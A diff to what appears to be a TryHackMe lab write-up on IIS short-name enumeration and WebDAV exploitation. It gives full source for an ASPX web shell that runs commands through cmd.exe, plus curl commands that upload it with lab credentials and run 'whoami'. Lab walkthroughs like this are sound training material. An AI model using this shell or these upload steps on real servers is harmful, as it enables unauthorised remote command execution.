@@ -66,3 +66,56 @@ python3 iis_shortname_scan.py http://machine_ip/
 
 ## What short name tells you?
 ![shortname](/images/Tryhackme/shortname.png)
+
+## Enumerating the Discovered Directory
+- Short name **backup~1** tells you that directory name starts with **backup**
+- IIS doesn't serve content via short-name URL path directly, scanner exploits response differences, not direct resolution
+```
+curl http://machine_ip/BackupFiles/
+```
+- Directory listing is enabled and reveals one file **webdav_notes.txt**
+- In real engagement we need to try several completions like **/backup/**, **/BackupFiles/**, **/backup_data/** or use wordlist against the confirmed 6-character prefix
+```
+curl http://machine_ip/BackupFiles/webdav_notes.txt
+```
+
+
+
+# WebDAV Exploitation: Uploading an ASPX Shell
+## Three conditions for a successful shell upload
+    1. WebDAV is enabled on the target directory
+    2. Valid credentials with write permission on the WebDAV directory
+    3. Script Execute is set, IIS passes **.aspx** request to the ASP.NET handler rather than serving them as static content
+
+## Preparing the ASPX Shell
+- Save following as **cmd.aspx**. It accepts as **cmd** query parameter, runs it through **cmd.exe** and returns the output
+```
+<​%@ Page Language="C#" %​>
+<​% 
+  string cmd = Request.QueryString["cmd"];
+  if (!string.IsNullOrEmpty(cmd)) {
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+  }
+%​>
+```
+
+## Uploading the Shell
+- IIS protects the **/webdav/** directory with windows Authentication
+- Anonymous user can only read(**GET**), but write operations (**PUT, DELETE, MOVE**) require valid Windows identity
+- NTLM proves that identity without transmitting the plaintext password(**--ntlm** tells use this handshake protocol for authentication)
+```
+curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://machine_ip/webdav/cmd.aspx
+```
+
+## Confirming Execution
+- Request shell with a test command
+```
+curl "http://machine_ip/webdav/cmd.aspx?cmd=whoami"
+```
+- If you get blank response or  500 error, Script Execute permission is not set
